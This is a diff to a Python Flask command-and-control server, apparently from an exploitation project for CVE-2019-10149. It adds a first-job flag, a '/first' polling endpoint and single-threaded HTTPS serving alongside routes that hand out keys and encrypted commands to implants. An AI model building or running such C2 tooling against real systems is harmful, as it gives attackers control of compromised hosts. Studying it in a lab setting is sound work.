@@ -17,6 +17,7 @@ BLOCK_SIZE = 16
 
 key_path = "../key.txt"
 server_derived_key = None
+first_job = True
 
 
 
@@ -186,6 +187,9 @@ def get_command():
         with open(COMMAND_FILE, "w") as f:
             f.write("")
         if cmd:
+            if cmd == "HELO":
+                global first_job
+                first_job = True
             secret_cmd = do_everything(cmd)
             return jsonify({"data": secret_cmd}), 200
         else:
@@ -210,8 +214,15 @@ def serve_file():
     
 @app.route("/key")
 def serve_key():
-    return send_from_directory("/home/kali/Desktop/CVE-2019-10149/C2Server", "cur_key.txt", as_attachment=True);
+    return send_from_directory("/home/kali/Desktop/CVE-2019-10149/C2Server", "cur_key.txt", as_attachment=True)
+
+@app.route("/first")
+def check_first():
+    global first_job
+    first_job_cpy = first_job
+    first_job = False
+    return jsonify(first_job_cpy)
 
 if __name__ == '__main__':
     # Run over HTTPS with cert.pem and key.pem in the same directory.
-    app.run(host='0.0.0.0', port=8080, ssl_context=('cert.pem', 'key.pem'))
+    app.run(host='0.0.0.0', port=8080, ssl_context=('cert.pem', 'key.pem'), threaded=False)
